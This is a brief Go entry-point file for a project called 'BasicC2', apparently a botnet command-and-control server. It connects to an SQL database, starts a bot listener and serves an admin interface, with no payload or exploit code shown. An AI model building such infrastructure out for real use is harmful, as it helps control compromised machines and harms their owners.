package main

import (
	"BasicC2/admin"
	botcontroller "BasicC2/botmonitor"
	"BasicC2/controller/sql"
	"BasicC2/json"
)

func init() {
	// Ping Sql And See if Connection Was Established
	sql.Sql_init(json.Config.Sqlsourcename)

	// Start Bot Listener
	go botcontroller.BotListener(json.Config.Botserve)
}

func main() {
	// Start Admin Listener
	admin.Adminserve()
}
